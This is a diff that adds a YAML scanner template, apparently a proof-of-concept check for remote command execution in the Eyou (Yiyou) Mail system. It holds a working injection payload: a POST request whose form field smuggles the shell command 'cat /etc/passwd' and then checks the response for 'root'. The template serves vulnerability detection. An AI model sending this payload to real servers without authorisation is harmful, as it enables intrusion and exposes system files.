@@ -1,0 +1,21 @@
+name: Eyou Mail system RCE
+manual: true
+query: app="Eyou-Mail-system"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /webadm/?q=moni_detail.do&action=gragh
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: type='|cat /etc/passwd||'
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: There is a remote command execution vulnerability in Yiyou e-mail system,
+    which allows attackers to execute arbitrary commands
+  tags: RCE
